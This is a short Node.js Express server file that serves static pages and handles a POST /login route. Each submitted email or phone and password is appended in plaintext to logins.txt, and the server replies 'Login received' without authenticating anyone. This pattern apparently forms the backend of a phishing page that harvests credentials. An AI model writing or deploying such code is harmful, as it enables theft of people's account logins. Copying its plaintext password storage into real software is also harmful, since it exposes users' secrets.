const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static('public'));

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email/Phone: ${email}, Password: ${password}\n`;
  
  fs.appendFile('logins.txt', entry, err => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Server error');
    }
    res.send('Login received');
  });
});

app.listen(3000, () => {
  console.log('Server running at http://localhost:3000');
});
